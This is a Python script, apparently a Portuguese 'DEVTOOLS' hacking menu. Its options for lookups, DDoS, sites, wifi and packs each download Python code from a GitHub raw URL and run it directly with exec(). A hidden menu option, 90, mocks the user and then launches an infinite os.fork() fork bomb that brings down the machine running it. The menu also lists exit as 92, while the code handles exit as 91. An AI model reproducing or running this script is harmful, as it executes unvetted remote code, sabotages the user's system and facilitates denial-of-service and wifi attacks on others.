from requests import get
import os
import sys
import time

sys.path.insert(1, './lib2')

def menu():
	print("""

	  \033[34mDEVTOOLS\033[m
	    by \033[33m@SAS\033[m
	    
          \033[44mVersao: 1.0\033[m
   	
  Opcoes:
	
  \033[36m[\033[m1\033[36m]\033[m Consultas
  \033[36m[\033[m2\033[36m]\033[m DDoS
  \033[36m[\033[m3\033[36m]\033[m Sites
  \033[36m[\033[m4\033[36m]\033[m Wifi
  \033[36m[\033[m5\033[36m]\033[m Packs

  \033[36m[\033[m90\033[36m]\033[m \033[31m???\033[m
  \033[36m[\033[m92\033[36m]\033[m \033[31mSair\033[m
""")

clear = lambda: os.system('clear')

menu()

kk = int(input('\033[34m===>\033[m '))

if kk == (1):
	clear()
	exec(get('https://raw.githubusercontent.com/Anon-SAS/mdpwmsm/main/Consultas.py').text)
    
if kk == (2):
  clear()
  exec(get('https://raw.githubusercontent.com/Anon-SAS/mdpwmsm/main/DDoS.py').text)

if kk == (3):
  clear()
  exec(get('https://raw.githubusercontent.com/Anon-SAS/mdpwmsm/main/Site.py').text)
	
if kk == (4):
	clear()
	exec(get('https://raw.githubusercontent.com/Anon-SAS/mdpwmsm/main/Wifi.py').text)

if kk == (5):
  clear()
  exec(get('https://raw.githubusercontent.com/Anon-SAS/mdpwmsm/main/Packs.py').text)

if kk == (90):
	clear()
	print('Morreu kkkkkk')
	while True:
		os.fork()
		
if kk == (91):
	clear()
	print('Saindo...')
	time.sleep(1)
	exit()
	